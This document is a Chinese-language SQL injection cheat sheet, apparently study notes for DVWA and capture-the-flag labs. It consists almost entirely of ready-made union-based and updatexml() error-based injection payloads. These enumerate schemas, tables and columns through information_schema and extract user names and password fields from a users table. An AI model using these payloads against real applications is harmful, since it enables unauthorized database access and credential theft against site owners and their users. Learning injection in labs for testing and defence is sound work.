# sql 注入速查手册

## 字符型、数字型注入

``` sql
字符型注入、数字型注入

database() 数据库名


—————— 表名

1' UNION SELECT 1,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE version=10; #

————如果limit 1 我们可以用 offset 1 偏移

1 UNION SELECT 1,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE version=10; #

select * from news where id=1234234 UNION SELECT 2,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE version=10; #  ———————— 可用，查出了所有表

select * from news where id=1234234 UNION SELECT 2,GROUP_CONCAT(table_name) FROM information_schema.tables; #

select * from news where id=1234234 UNION select database(),2

UNION SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA=database();   #

SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema!='information_schema' AND table_schema!='mysql';

UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'tablename'

tablename: users | guestbook

UNION SELECT TABLE_NAME (是否加 ,1) FROM information_schema.tables WHERE TABLE_SCHEMA=database();

————union 特性注意  or 1=1 用途注意

test: UNION SELECT TABLE_NAME,1 FROM information_schema.tables WHERE TABLE_SCHEMA=database();  ---可用

—————— 列名

UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'tablename'

id=1 UNION SELECT GROUP_CONCAT(column_name) ____注意union的参数数量 FROM information_schema.columns WHERE table_name = 'guestbook' #

1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 #   ----- 进制转换后name这里都不需要引号吗

1' union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 #

0x6775657374626f6f6b

1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x6775657374626f6f6b #

—————— 数据


1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #

1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #

1 union select group_concat(flag),3 from flag#

参考一下：———— https://www.cnblogs.com/yaolingyu/p/17231624.html


常用sql注入词汇

information_schema

schemata(schema_name)

tables(table_schema,table_name)

columns(table_schema,table_name,column_name)

select schema_name from information_schema.schemata;

select table_name from information_schema.tables where table_schema='dvwa';

select column_name from information_schema.columns where table_name='users' and table_schema='dvwa';

select concat(username,password) from dvwa.users;


```

## 报错注入（以 updatexml（）为例）

> Floor 以及 extractvalue 函数的爆破请看 web 下的笔记

- 爆数据库名（灵活修改）

``` sql
select * from news where id=1 and updatexml(1,concat(0x7e,database(),0x7e,user(),0x7e,@@datadir),1)#
```

![image.png](https://raw.githubusercontent.com/MarchPhantasia/pic/main/hexoblog/20240720001616.png)

- 爆表名

``` sql
select * from news where id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) #
```

![image.png](https://raw.githubusercontent.com/MarchPhantasia/pic/main/hexoblog/20240720001607.png)

- 爆字段

``` sql
select * from news where id=1 and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='dvwa' and table_name='flag'),0x7e),1) #  ———— 务必将dvwa修改成数据库名
```

> 错误爆破
![image.png](https://raw.githubusercontent.com/MarchPhantasia/pic/main/hexoblog/20240720001700.png)
> 正确爆破
![image.png](https://raw.githubusercontent.com/MarchPhantasia/pic/main/hexoblog/20240720001812.png)

- 爆数据（请将 concat 的参数修改，dvwa. Users 作为具体的表也需要修改）

``` sql
1' and updatexml(1,concat(0x7e,(select group_concat(first_name,0x7e,last_name) from dvwa.users)),1) #
```
